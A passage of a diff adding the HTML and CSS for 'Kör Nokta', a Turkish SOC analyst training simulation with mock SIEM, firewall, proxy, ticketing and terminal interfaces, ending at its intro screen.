@@ -1,0 +1,2229 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <script src="/js/gtag.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <link rel="icon" type="image/png" href="/images/SEBS.png" />
+  <meta name="theme-color" content="#0b0f14" />
+  <base href="/" />
+  <title>Kör Nokta — SOC Analisti Simülasyonu | SEBS Global</title>
+  <meta name="description" content="SOC analisti simülasyonu: SIEM, olay triage, önceliklendirme ve müdahale kararları. Tüm veriler simüle edilmiştir." />
+  <meta name="robots" content="noindex, nofollow" />
+  <script src="/utils/simulation-tracker.js"></script>
+<style>
+:root {
+  --bg:#0b0f14; --panel:#141b24; --panel2:#1a2330; --line:rgba(120,150,180,.18);
+  --text:#e4ecf4; --muted:#8fa3b8; --accent:#4a90d9; --accent2:#2d6cb5;
+  --warn:#e5a045; --crit:#e05555; --ok:#3dba7a; --info:#5eb8c9;
+  --mono:Consolas,"Cascadia Mono",monospace; --taskbar:42px; --shadow:0 12px 40px rgba(0,0,0,.45);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{font-family:"Segoe UI",system-ui,sans-serif;background:var(--bg);color:var(--text);overflow:hidden;font-size:13px;line-height:1.5}
+button,input,select,textarea{font:inherit;cursor:pointer}
+.hidden{display:none!important}
+.btn{padding:8px 14px;border-radius:6px;border:1px solid var(--accent2);background:var(--accent);color:#fff;font-weight:600;font-size:12px}
+.btn:hover{filter:brightness(1.08)}.btn:disabled{opacity:.45;cursor:not-allowed}
+.btn.ghost{background:transparent;border-color:var(--line);color:var(--muted)}
+.btn.sm{padding:5px 10px;font-size:11px}.btn.ok{background:#1a7a52;border-color:#25966a}
+.btn.warn{background:#9a6418;border-color:#b8781f}
+.intro{position:fixed;inset:0;z-index:2000;display:grid;place-items:center;background:linear-gradient(160deg,#060910,#0f1724 50%,#060910)}
+.intro-card{width:min(520px,94vw);padding:36px;background:var(--panel);border:1px solid var(--line);border-radius:10px;text-align:center}
+.intro-card h1{font-size:22px;letter-spacing:.04em;margin-bottom:8px}
+.intro-card .sub{color:var(--muted);font-size:13px;margin-bottom:20px}
+.intro-card input{width:100%;padding:10px;margin-bottom:14px;background:var(--bg);border:1px solid var(--line);border-radius:8px;color:var(--text);text-align:center}
+.desktop{position:fixed;inset:0;background:linear-gradient(145deg,rgba(74,144,217,.05),transparent 40%),radial-gradient(circle at 80% 15%,rgba(45,108,181,.12),transparent 35%),linear-gradient(165deg,#0a1018,#122033 55%,#080d14)}
+.wm{position:absolute;left:20px;bottom:calc(var(--taskbar)+18px);font-size:26px;font-weight:800;letter-spacing:.06em;color:rgba(255,255,255,.035);pointer-events:none}
+.icons{position:absolute;inset:10px 10px calc(var(--taskbar)+10px);display:flex;flex-wrap:wrap;align-content:flex-start;gap:2px 6px}
+.dicon{width:84px;padding:8px 4px;border-radius:6px;text-align:center;cursor:default;user-select:none}
+.dicon:hover{background:rgba(255,255,255,.06)}.dicon.sel{background:rgba(74,144,217,.18);outline:1px solid rgba(74,144,217,.35)}
+.dicon.locked{opacity:.35;pointer-events:none}.dicon.pulse .dglyph{animation:mpulse 1.4s ease infinite}
+@keyframes mpulse{0%,100%{transform:scale(1)}50%{transform:scale(1.12);filter:brightness(1.3)}}
+.dglyph{font-size:26px;line-height:1;margin-bottom:4px}.dlabel{font-size:10px;color:#d0e0f0;line-height:1.25;word-break:break-word}
+.chrono-hint-bar{position:fixed;top:44px;right:12px;z-index:340;display:flex;align-items:center;gap:8px}
+.chrono-w{padding:6px 12px;border-radius:8px;border:1px solid rgba(94,184,201,.35);background:rgba(12,20,30,.92);font-family:var(--mono);font-size:13px;font-weight:700;color:var(--info);box-shadow:var(--shadow)}
+.chrono-w small{display:block;font-size:9px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;font-family:"Segoe UI",sans-serif;margin-bottom:2px}
+.hint-top-btn{padding:6px 12px;border-radius:8px;border:1px solid rgba(229,160,69,.45);background:rgba(154,100,24,.35);color:#fcd34d;font-size:11px;font-weight:700;cursor:pointer;box-shadow:var(--shadow)}
+.hint-top-btn:hover{background:rgba(180,120,30,.5)}
+.hint-layer{position:fixed;inset:0;z-index:500;display:grid;place-items:center;background:rgba(0,8,16,.55);padding:20px}
+.hint-layer-card{width:min(480px,94vw);padding:20px;background:var(--panel);border:1px solid var(--line);border-radius:10px;box-shadow:var(--shadow)}
+.hint-layer-card h3{font-size:15px;margin-bottom:6px}
+.hint-layer-card .hint-stage{font-size:11px;color:var(--info);margin-bottom:12px}
+.hint-layer-card p{font-size:13px;color:var(--muted);line-height:1.65;margin:0 0 10px}
+.hint-body{font-size:13px;color:var(--muted);line-height:1.65}
+.hint-body p{margin:0 0 10px}
+.hint-body p:last-child,.hint-body ul:last-child,.hint-body ol:last-child{margin-bottom:0}
+.hint-list{margin:6px 0 10px 18px;padding:0}
+.hint-list li{margin:4px 0}
+.hint-body code{font-size:12px;color:var(--text);background:rgba(0,0,0,.25);padding:2px 6px;border-radius:4px}
+.hint-body b{color:var(--text);font-weight:600}
+.taskbar{position:absolute;left:0;right:0;bottom:0;height:var(--taskbar);display:flex;align-items:center;gap:5px;padding:0 8px;background:rgba(8,14,22,.96);border-top:1px solid var(--line);z-index:50}
+.start-btn{width:34px;height:30px;border-radius:5px;border:1px solid var(--line);background:rgba(16,28,42,.95);color:var(--accent);cursor:pointer;font-weight:800;font-size:14px}
+.task-btns{flex:1;display:flex;gap:3px;overflow-x:auto;min-width:0}
+.task-btn{max-width:150px;padding:5px 9px;border-radius:5px;border:1px solid transparent;background:rgba(255,255,255,.04);color:#b8d0e8;font-size:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;cursor:pointer}
+.task-btn.on{border-color:rgba(74,144,217,.45);background:rgba(74,144,217,.12)}
+.tb-stats{display:flex;gap:10px;font-size:10px;color:var(--muted);white-space:nowrap;padding:0 6px}
+.tb-stats b{color:var(--text);font-family:var(--mono)}
+.tb-clock{font-size:11px;color:var(--muted);padding:0 8px;white-space:nowrap}
+.start-menu{position:absolute;left:6px;bottom:calc(var(--taskbar)+3px);z-index:60;min-width:210px;padding:5px;border:1px solid var(--line);border-radius:8px;background:rgba(10,18,28,.98);box-shadow:var(--shadow)}
+.start-menu button{display:block;width:100%;border:0;border-radius:6px;background:transparent;color:#dce8f4;text-align:left;padding:7px 10px;cursor:pointer;font-size:12px}
+.start-menu button:hover{background:rgba(74,144,217,.1)}.start-menu button.locked{opacity:.35;pointer-events:none}
+.win{position:absolute;border:1px solid var(--line);border-radius:8px;background:#0e1620;box-shadow:var(--shadow);display:flex;flex-direction:column;min-width:300px;min-height:180px;overflow:hidden}
+.win.max{left:8px!important;top:8px!important;width:calc(100% - 16px)!important;height:calc(100% - var(--taskbar) - 16px)!important}
+.win-title{display:flex;align-items:center;gap:6px;padding:7px 10px;background:linear-gradient(180deg,#1a2a3c,#121e2c);border-bottom:1px solid var(--line);cursor:move;flex-shrink:0}
+.win-title span{flex:1;font-size:11px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.wctrl{width:26px;height:22px;border:0;border-radius:4px;background:rgba(255,255,255,.06);color:#b8d0e8;cursor:pointer;font-size:11px}
+.wctrl:hover{background:rgba(255,255,255,.12)}.wctrl.x:hover{background:var(--crit);color:#fff}
+.win-body{flex:1;overflow:auto;padding:0;font-size:12px;line-height:1.45}
+.toast-wrap{position:fixed;right:14px;top:48px;bottom:auto;z-index:400;display:grid;gap:6px;width:min(340px,calc(100vw - 28px))}
+.toast{border:1px solid var(--line);border-left:4px solid var(--accent);border-radius:8px;padding:9px 11px;background:rgba(10,18,28,.96);font-size:11px;line-height:1.4;animation:tin .28s ease}
+.toast.ok{border-left-color:var(--ok)}.toast.bad{border-left-color:var(--crit)}.toast.warn{border-left-color:var(--warn)}
+@keyframes tin{from{opacity:0;transform:translateX(10px)}to{opacity:1;transform:none}}
+.tag{display:inline-block;padding:3px 7px;border-radius:4px;background:var(--panel2);border:1px solid var(--line);font-size:10px}
+.tag.crit{border-color:var(--crit);color:#f5a5a5}.tag.warn{border-color:var(--warn);color:#f5d08a}.tag.ok{border-color:var(--ok);color:#8ee4b8}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:10px}
+.card h4{font-size:11px;margin-bottom:8px;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
+.choices{display:grid;gap:6px;margin-top:8px}
+.choice{text-align:left;padding:10px 12px;background:var(--panel2);border:1px solid var(--line);border-radius:6px;color:var(--text);font-size:12px;width:100%}
+.choice:hover{border-color:var(--accent)}.choice.pok{border-color:var(--ok);background:rgba(61,186,122,.1)}.choice.pbad{border-color:var(--crit);background:rgba(224,85,85,.08)}
+.choice:disabled{opacity:.5;cursor:not-allowed;pointer-events:none}
+.choice.reveal-ok{opacity:1!important;pointer-events:auto!important;border-color:var(--ok);background:rgba(61,186,122,.15);box-shadow:0 0 0 1px var(--ok)}
+.quiz-explain{margin-top:10px;padding:12px 14px;background:rgba(154,100,24,.2);border:1px solid rgba(229,160,69,.5);border-left:4px solid var(--warn);border-radius:6px;font-size:12px;line-height:1.65;color:#fde68a}
+.quiz-explain>b{display:block;margin-bottom:6px;font-size:11px;color:#fcd34d}
+.quiz-explain ul{margin:8px 0 0 18px;font-size:11px}
+.quiz-explain li{margin-bottom:4px}
+.quiz-explain p{margin:8px 0 0}
+.term{background:#050810;border:1px solid var(--line);border-radius:6px;padding:12px;font-family:var(--mono);font-size:11px;line-height:1.55;color:#7dd3fc;white-space:pre-wrap;overflow-x:auto}
+.term .err{color:#f87171}.term .okl{color:#86efac}
+table.dt{width:100%;border-collapse:collapse;font-size:11px}table.dt th,table.dt td{padding:7px 9px;text-align:left;border-bottom:1px solid var(--line)}
+table.dt th{color:var(--muted);font-weight:600;background:rgba(0,0,0,.15)}
+.query-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;font-family:var(--mono);font-size:10px;color:var(--muted)}
+.health{display:grid;grid-template-columns:repeat(2,1fr);gap:6px;font-size:11px}.health span{color:var(--muted)}.health .bad{color:var(--crit);font-weight:600}
+.rule-card{border:1px solid var(--accent2);background:rgba(74,144,217,.06)}.rule-card dl{font-size:11px;display:grid;grid-template-columns:110px 1fr;gap:5px 10px}.rule-card dt{color:var(--muted)}
+.tl-item{padding:8px 10px;background:var(--panel2);border:1px solid var(--line);border-radius:6px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;margin-bottom:5px}
+.tl-item.tl-picked{border-color:var(--accent);background:rgba(74,144,217,.14)}
+.tl-item.locked{opacity:.55;cursor:not-allowed;pointer-events:none}
+.tl-pick-num{min-width:22px;font-weight:700;color:var(--accent);font-family:var(--mono)}
+.tl-pick-num.empty{color:var(--muted);font-weight:400}
+.tl-pick-text{flex:1}
+.match-grid select:disabled{opacity:.7;cursor:not-allowed}
+.prio-locked .prio-item,.prio-locked .prio-col,.prio-locked .prio-pool{pointer-events:none;opacity:.85}
+.tl-item .tlt{font-family:var(--mono);color:var(--info);min-width:48px}.tl-slot{padding:7px 10px;margin-bottom:5px;border-radius:5px;background:rgba(74,144,217,.12);border:1px dashed var(--accent);font-size:11px;min-height:32px}
+.match-grid{display:grid;gap:8px}.match-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;align-items:center;font-size:11px}
+.match-row select{padding:6px;background:var(--bg);border:1px solid var(--line);border-radius:5px;color:var(--text);font-size:11px}
+.prio-cols{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}.prio-col{min-height:110px;padding:8px;border-radius:6px;border:1px dashed var(--line);background:var(--panel2);transition:border-color .15s,background .15s}
+.prio-col h5{font-size:10px;margin-bottom:6px;color:var(--muted)}.prio-col.urgent h5{color:var(--crit)}.prio-col.week h5{color:var(--warn)}.prio-col.month h5{color:var(--ok)}
+.prio-col.drag-over,.prio-pool.drag-over{border-color:var(--accent);background:rgba(74,144,217,.14);box-shadow:inset 0 0 0 1px rgba(74,144,217,.35)}
+.prio-pool{min-height:72px;padding:8px;border-radius:6px;border:1px dashed var(--line);background:var(--bg);display:flex;flex-direction:column;gap:5px}
+.prio-item{padding:7px;font-size:10px;background:var(--panel);border:1px solid var(--line);border-radius:5px;cursor:grab;user-select:none}
+.prio-item:active{cursor:grabbing}.prio-item.dragging{opacity:.35;border-style:dashed}
+.prio-item.in{cursor:grab}
+.brief-section{margin-bottom:10px}.brief-section label{display:block;font-size:11px;color:var(--muted);margin-bottom:4px}
+.brief-section textarea{width:100%;min-height:65px;padding:8px;background:var(--bg);border:1px solid var(--line);border-radius:6px;color:var(--text);resize:vertical;font-size:12px}
+.ev-card{padding:9px;margin-bottom:6px;border-radius:6px;border:1px solid var(--line);font-size:11px;background:var(--panel2)}
+.ev-card.crit{border-color:rgba(224,85,85,.5);background:rgba(224,85,85,.07)}.ev-card.warn{border-color:rgba(229,160,69,.5);background:rgba(229,160,69,.07)}
+.ev-card b{display:block;margin-bottom:3px;font-size:10px;color:var(--warn)}
+/* Outlook */
+.ol-app{display:flex;flex-direction:column;height:100%;min-height:320px}
+.ol-bar{background:#0078d4;color:#fff;padding:8px 12px;font-size:13px;font-weight:600}
+.ol-body{display:flex;flex:1;min-height:0}
+.ol-side{width:140px;background:#f3f3f3;color:#333;border-right:1px solid #ddd;padding:8px 0;font-size:11px;flex-shrink:0}
+.ol-side div{padding:6px 12px;cursor:pointer}.ol-side div.on{background:#e1dfdd;font-weight:600}
+.ol-list{width:200px;background:#fafafa;border-right:1px solid #ddd;overflow-y:auto;flex-shrink:0}
+.ol-item{padding:10px;border-bottom:1px solid #eee;cursor:pointer;font-size:11px;color:#333}
+.ol-item.on{background:#c7e0f4;border-left:3px solid #0078d4}.ol-item.unread{font-weight:700}
+.ol-read{flex:1;background:#fff;color:#333;padding:16px;overflow-y:auto}
+.ol-read h3{font-size:15px;color:#0078d4;margin-bottom:10px}.ol-meta{font-size:11px;color:#666;margin-bottom:12px}
+.ol-read ul{margin:8px 0 0 16px;font-size:12px;line-height:1.6}
+.ol-read p{font-size:12px;line-height:1.65;margin-bottom:10px}
+.ol-read .ol-actions{margin:14px 0;padding:12px 14px;background:#f0f6fc;border-left:4px solid #0078d4;border-radius:0 4px 4px 0}
+.ol-read .ol-actions b{display:block;margin-bottom:6px;font-size:12px;color:#0078d4}
+.ol-read .ol-actions ol{margin:0 0 0 18px;font-size:12px;line-height:1.65}
+/* SIEM */
+.siem-app{background:#1a1d23;min-height:320px;display:flex;flex-direction:column}
+.siem-top{background:#23262e;border-bottom:1px solid #333;padding:8px 12px;display:flex;align-items:center;gap:8px}
+.siem-logo{font-weight:800;color:#00b488;font-size:13px}.siem-search{flex:1;display:flex;gap:6px}
+.siem-search input{flex:1;padding:6px 10px;background:#12141a;border:1px solid #444;border-radius:4px;color:#e0e0e0;font-family:var(--mono);font-size:11px}
+.siem-body{padding:12px;flex:1;min-height:180px}
+.siem-empty{color:#888;font-size:12px;padding:20px;text-align:center}
+.siem-loading{padding:28px 16px;text-align:center}
+.siem-loading .siem-spin{width:28px;height:28px;margin:0 auto 14px;border:3px solid #333;border-top-color:#00b488;border-radius:50%;animation:siemspin .85s linear infinite}
+.siem-loading p{color:#aaa;font-size:12px;margin:4px 0}
+.siem-loading .siem-prog{height:4px;background:#2a2d35;border-radius:2px;margin:14px auto 0;max-width:280px;overflow:hidden}
+.siem-loading .siem-prog i{display:block;height:100%;width:40%;background:#00b488;border-radius:2px;animation:siemprog 1.2s ease-in-out infinite}
+@keyframes siemspin{to{transform:rotate(360deg)}}
+@keyframes siemprog{0%{margin-left:-40%}100%{margin-left:100%}}
+/* ServiceNow */
+.sn-app{min-height:320px}.sn-bar{background:#293e51;color:#fff;padding:8px 14px;font-size:13px;font-weight:700;display:flex;align-items:center;gap:8px}
+.sn-body{padding:14px;background:#f4f4f4;color:#333}
+.sn-record{background:#fff;border:1px solid #ddd;border-radius:4px;padding:14px}
+.sn-field{display:grid;grid-template-columns:130px 1fr;gap:4px 10px;font-size:11px;margin-bottom:6px;padding-bottom:6px;border-bottom:1px solid #eee}
+.sn-field label{color:#666;font-weight:600}.sn-health{margin-top:12px;padding:10px;background:#fff3f3;border:1px solid #f5c6c6;border-radius:4px}
+/* Windows Terminal + OpenSSH (SOC istasyonunda Linux sunucuya bağlantı) */
+.wt-app{background:#0c0c0c;min-height:340px;display:flex;flex-direction:column;height:100%;max-height:100%}
+.wt-chrome{background:#1f1f1f;border-bottom:1px solid #333;padding:0 8px;display:flex;align-items:center;gap:8px;font-size:10px;color:#ccc;flex-shrink:0}
+.wt-chrome b{color:#fff;font-weight:600}
+.wt-tabs{display:flex;gap:2px;padding:4px 8px 0;background:#252526;border-bottom:1px solid #333;flex-shrink:0}
+.wt-tab{padding:5px 12px;font-size:10px;color:#999;border-radius:4px 4px 0 0;background:#2d2d2d}
+.wt-tab.on{background:#0c0c0c;color:#fff;border:1px solid #333;border-bottom-color:#0c0c0c}
+.wt-body{flex:1 1 auto;padding:10px 12px 14px;font-family:var(--mono);font-size:11px;line-height:1.55;overflow-y:auto;overflow-x:hidden;min-height:120px;background:#0c0c0c}
+.wt-out{color:#cccccc;white-space:pre-wrap;margin:0 0 2px;word-break:break-word}
+.wt-out.err{color:#f87171}.wt-out.sys{color:#6ee7b7}
+.wt-out.out{color:#cccccc}
+.wt-line-prompt{display:flex;flex-wrap:wrap;align-items:baseline;margin:0 0 2px;line-height:1.55}
+.wt-prompt-prefix{color:#4ade80;white-space:pre;flex-shrink:0}
+.wt-cmd-text{color:#cccccc;white-space:pre-wrap;word-break:break-word}
+.wt-inline-input{flex:1;min-width:120px;background:transparent;border:none;color:#cccccc;font-family:var(--mono);font-size:11px;line-height:1.55;outline:none;padding:0;margin:0;caret-color:#e8e8e8}
+#body-terminal{padding:0;display:flex;flex-direction:column;overflow:hidden;min-height:280px}
+/* Palo Alto Panorama */
+#body-firewall{padding:0;overflow:hidden;display:flex;flex-direction:column}
+.pa-app{display:flex;flex-direction:column;min-height:360px;height:100%;background:#e8eaed;font-family:"Segoe UI",system-ui,sans-serif;font-size:12px;color:#1a1a1a}
+.pa-top{background:linear-gradient(180deg,#f26522,#e25614);color:#fff;height:34px;padding:0 14px;display:flex;align-items:center;gap:12px;flex-shrink:0;border-bottom:1px solid #c94f14;box-shadow:0 1px 3px rgba(0,0,0,.15)}
+.pa-logo{font-weight:800;font-size:12px;letter-spacing:.02em;white-space:nowrap}
+.pa-top-sep{opacity:.45}
+.pa-top-title{font-size:11px;font-weight:600;opacity:.95}
+.pa-top-meta{margin-left:auto;display:flex;align-items:center;gap:14px;font-size:10px}
+.pa-top-meta b{font-weight:700}
+.pa-shell{display:flex;flex:1;min-height:0}
+.pa-nav{width:152px;background:#3d4f5f;color:#c5d0db;flex-shrink:0;font-size:10px;overflow-y:auto}
+.pa-nav-h{padding:10px 12px 6px;font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:#8fa3b5;font-weight:700}
+.pa-nav-item{display:block;padding:7px 12px;color:#dce4eb;border-left:3px solid transparent;cursor:default;line-height:1.35}
+.pa-nav-item.sub{padding-left:22px;font-size:10px;color:#a8b8c6}
+.pa-nav-item.on{background:#2a3642;color:#fff;border-left-color:#f26522;font-weight:600}
+.pa-main{flex:1;display:flex;flex-direction:column;min-width:0;background:#fff}
+.pa-breadcrumb{padding:6px 14px;background:#f4f5f7;border-bottom:1px solid #d5d9de;font-size:10px;color:#5c6b7a}
+.pa-breadcrumb b{color:#2a3642}
+.pa-toolbar{padding:8px 14px;background:#fafbfc;border-bottom:1px solid #dde1e5;display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end}
+.pa-log-tabs{display:flex;gap:1px;align-self:flex-start}
+.pa-log-tab{padding:6px 12px;font-size:10px;border:1px solid #c5ccd4;background:#eef1f4;color:#5c6b7a;border-radius:2px 2px 0 0;margin-bottom:-1px}
+.pa-log-tab.on{background:#fff;color:#e25614;font-weight:700;border-top:2px solid #e25614;border-bottom-color:#fff}
+.pa-qrow{display:flex;flex-wrap:wrap;gap:8px;align-items:center;flex:1}
+.pa-qfield{display:flex;flex-direction:column;gap:2px}
+.pa-qfield label{font-size:9px;font-weight:700;color:#5c6b7a;text-transform:uppercase;letter-spacing:.04em}
+.pa-qfield input{padding:5px 8px;border:1px solid #b8c0c8;border-radius:2px;font-size:11px;width:130px;font-family:var(--mono);background:#fff}
+.pa-qfield input[readonly]{background:#f4f5f7;color:#333}
+.pa-btn-run{padding:6px 16px;background:#e25614;color:#fff;border:none;border-radius:2px;font-size:11px;font-weight:700;cursor:pointer;height:28px;align-self:flex-end}
+.pa-btn-run:hover{background:#cc4d12}
+.pa-content{flex:1;overflow:auto;min-height:0}
+.pa-empty{padding:32px 20px;text-align:center;color:#5c6b7a;font-size:11px;line-height:1.6}
+.pa-summary{padding:8px 14px;background:#fff8e6;border-bottom:1px solid #f0d9a8;font-size:11px;color:#6b5200}
+.pa-table{width:100%;border-collapse:collapse;font-size:10px}
+.pa-table th{background:#eef1f4;color:#3d4f5f;font-weight:700;text-align:left;padding:7px 10px;border-bottom:2px solid #c5ccd4;white-space:nowrap;position:sticky;top:0;z-index:1}
+.pa-table td{padding:6px 10px;border-bottom:1px solid #e8ebef;vertical-align:top}
+.pa-table tbody tr:hover td{background:#f0f7fc}
+.pa-mono{font-family:var(--mono);font-size:10px}
+.pa-act-allow{color:#0a6e3d;font-weight:700;text-transform:lowercase}
+.pa-rule-panel{margin:12px 14px;border:1px solid #d0d4d8;border-radius:3px;background:#fafbfc;overflow:hidden}
+.pa-rule-h{padding:8px 12px;background:linear-gradient(180deg,#eef1f4,#e4e8ec);border-bottom:1px solid #d0d4d8;font-weight:700;font-size:11px;color:#2a3642}
+.pa-rule-body{padding:10px 12px}
+.pa-rule-body dl{display:grid;grid-template-columns:100px 1fr;gap:6px 12px;margin:0;font-size:11px}
+.pa-rule-body dt{color:#5c6b7a;font-weight:600}
+.pa-statusbar{padding:5px 14px;background:#f4f5f7;border-top:1px solid #dde1e5;font-size:10px;color:#5c6b7a;display:flex;gap:18px;flex-shrink:0}
+.pa-statusbar .ok{color:#0a6e3d;font-weight:700}
+.pa-mcq{margin:0 14px 14px;padding:12px;background:#fff;border:1px solid #d0d4d8;border-radius:3px}
+.pa-mcq h4{font-size:12px;margin-bottom:10px;color:#2a3642}
+.pa-foot-actions{padding:0 14px 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.pa-mcq .choices{margin-top:0}
+/* Blue Coat ProxySG / Edge SWG */
+#body-proxy{padding:0;overflow:hidden;display:flex;flex-direction:column}
+.bc-app{display:flex;flex-direction:column;min-height:360px;height:100%;background:#dde4ec;font-family:"Segoe UI",Tahoma,system-ui,sans-serif;font-size:12px;color:#1a2836}
+.bc-top{background:linear-gradient(180deg,#004b8d 0%,#003366 100%);color:#fff;height:36px;padding:0 14px;display:flex;align-items:center;gap:10px;flex-shrink:0;border-bottom:2px solid #002244;box-shadow:0 1px 4px rgba(0,0,0,.2)}
+.bc-logo{font-weight:700;font-size:11px;letter-spacing:.04em;text-transform:uppercase}
+.bc-logo em{font-style:normal;font-weight:400;opacity:.85;font-size:10px;margin-left:6px}
+.bc-top-meta{margin-left:auto;font-size:10px;display:flex;gap:14px;opacity:.92}
+.bc-top-meta b{font-weight:700}
+.bc-shell{display:flex;flex:1;min-height:0}
+.bc-nav{width:156px;background:#2d4a66;color:#b8c9d9;flex-shrink:0;font-size:10px;overflow-y:auto;border-right:1px solid #1e3347}
+.bc-nav-h{padding:9px 12px 5px;font-size:9px;text-transform:uppercase;letter-spacing:.09em;color:#7a9bb5;font-weight:700}
+.bc-nav-item{display:block;padding:6px 12px;color:#d4e2ec;border-left:3px solid transparent;line-height:1.35}
+.bc-nav-item.sub{padding-left:22px;font-size:10px;color:#9eb5c8}
+.bc-nav-item.on{background:#1e3347;color:#fff;border-left-color:#4a9fd4;font-weight:600}
+.bc-main{flex:1;display:flex;flex-direction:column;min-width:0;background:#f4f7fa}
+.bc-page-h{padding:10px 16px 8px;background:#fff;border-bottom:1px solid #c5d0db}
+.bc-page-h h2{margin:0;font-size:14px;font-weight:700;color:#003366}
+.bc-page-h p{margin:4px 0 0;font-size:10px;color:#5a6f82}
+.bc-panel{margin:12px 16px;background:#fff;border:1px solid #b8c5d4;border-radius:2px;box-shadow:0 1px 2px rgba(0,40,80,.06)}
+.bc-panel-h{padding:8px 12px;background:linear-gradient(180deg,#e8eef4,#dce6f0);border-bottom:1px solid #b8c5d4;font-size:11px;font-weight:700;color:#003366}
+.bc-form{padding:12px 14px;display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px 14px;align-items:end}
+.bc-field label{display:block;font-size:9px;font-weight:700;color:#4a6278;text-transform:uppercase;letter-spacing:.04em;margin-bottom:3px}
+.bc-field select,.bc-field input{width:100%;padding:5px 8px;border:1px solid #9eb0c2;border-radius:2px;font-size:11px;background:#fff;font-family:var(--mono)}
+.bc-field input[readonly]{background:#f0f4f8;color:#333}
+.bc-actions{padding:0 14px 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center;border-top:1px solid #e4eaf0;margin-top:0}
+.bc-btn-primary{padding:6px 16px;background:#0066b3;color:#fff;border:1px solid #004d85;border-radius:2px;font-size:11px;font-weight:700;cursor:pointer}
+.bc-btn-primary:hover{background:#005599}
+.bc-btn-sec{padding:5px 12px;background:#e8eef4;color:#003366;border:1px solid #9eb0c2;border-radius:2px;font-size:10px;font-weight:600;cursor:pointer}
+.bc-content{flex:1;overflow:auto;min-height:0;padding:0 16px 12px}
+.bc-query-tags{display:flex;flex-wrap:wrap;gap:6px;padding:10px 0 6px;font-size:10px}
+.bc-tag{padding:3px 8px;background:#e3edf7;border:1px solid #9eb8d4;border-radius:2px;color:#003366;font-family:var(--mono)}
+.bc-zero{padding:20px;text-align:center;background:#fff;border:1px solid #b8c5d4;margin-top:8px}
+.bc-zero b{display:block;font-size:22px;color:#8b1a1a;margin-bottom:6px}
+.bc-zero span{font-size:11px;color:#5a6f82}
+.bc-table{width:100%;border-collapse:collapse;font-size:10px;background:#fff;border:1px solid #b8c5d4;margin-top:8px}
+.bc-table th{background:#003366;color:#fff;font-weight:600;text-align:left;padding:6px 8px;white-space:nowrap;position:sticky;top:0}
+.bc-table td{padding:5px 8px;border-bottom:1px solid #e4eaf0;font-family:var(--mono);font-size:10px;color:#333}
+.bc-table tbody tr:hover td{background:#f0f7fc}
+.bc-insight{margin-top:10px;padding:12px 14px;background:#fff8e6;border:1px solid #e8d4a8;border-left:4px solid #c9a227;font-size:11px;line-height:1.65;color:#4a4020}
+.bc-insight b{color:#6b5200}
+.bc-foot{padding:5px 16px;background:#e8eef4;border-top:1px solid #c5d0db;font-size:10px;color:#4a6278;display:flex;gap:16px;flex-shrink:0}
+.bc-foot .on{color:#0a6e3d;font-weight:700}
+.bc-empty{padding:28px 16px;text-align:center;color:#5a6f82;font-size:11px;line-height:1.6}
+.bc-ev-row{padding:0 0 12px;display:flex;gap:8px;flex-wrap:wrap}
+/* IR Portal */
+.ir-app{min-height:320px;display:flex;flex-direction:column}.ir-bar{background:#2c3e50;color:#fff;padding:8px 14px;font-size:12px;font-weight:700}
+.ir-tabs{display:flex;border-bottom:1px solid var(--line);background:var(--panel2)}
+.ir-tab{flex:1;padding:8px;border:0;background:transparent;color:var(--muted);font-size:11px;cursor:pointer;border-bottom:2px solid transparent}
+.ir-tab.on{color:var(--text);border-bottom-color:var(--accent);background:rgba(74,144,217,.08)}
+.ir-body{padding:12px;flex:1;overflow:auto}
+/* Mission */
+.mis-app{padding:14px;min-height:280px}.mis-stage{font-size:10px;color:var(--info);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px}
+.mis-title{font-size:16px;font-weight:700;margin-bottom:8px}.mis-obj{font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.55}
+.mis-hint{padding:10px;background:rgba(74,144,217,.08);border:1px solid rgba(74,144,217,.25);border-radius:6px;font-size:11px;color:#b8d4f0;margin-bottom:10px}
+.mis-fb{min-height:22px;font-size:12px;margin-bottom:10px}.mis-fb.ok{color:var(--ok)}.mis-fb.bad{color:var(--crit)}.mis-fb.warn{color:var(--warn)}
+.mis-steps{margin:10px 0;padding-left:16px;font-size:11px;color:var(--muted)}.mis-steps li{margin-bottom:4px}
+.result-screen{position:fixed;inset:0;z-index:1900;overflow-y:auto;padding:40px 20px;background:var(--bg)}
+.result-card{max-width:720px;margin:0 auto;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:32px}
+.result-card h1{font-size:20px;margin-bottom:12px}.result-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0}
+.result-grid .box{text-align:center;padding:12px;background:var(--panel2);border-radius:6px}
+.result-grid .box b{display:block;font-size:22px;color:var(--accent)}.result-grid .box span{font-size:10px;color:var(--muted)}
+ul.learn{margin:12px 0 0 16px;color:var(--muted);font-size:12px}ul.learn li{margin-bottom:5px}
+@media(max-width:700px){.match-row,.prio-cols,.result-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<section class="intro" id="intro">
+  <div class="intro-card">
+    <h1>KÖR NOKTA</h1>
+    <p class="sub">SOC Analisti Simülasyonu · AktaşMakina A.Ş.<br/>Salı 09:17 — Vardiya başlangıcı</p>
+    <input type="text" id="analystName" placeholder="Analist adınız" maxlength="40" autocomplete="name" />
+    <p class="sub" style="margin-bottom:16px">SIEM sessiz. Ama olay gerçek mi? Görünürlük boşluklarını bul.</p>
+    <button type="button" class="btn" id="btnStart">Vardiyayı Başlat</button>
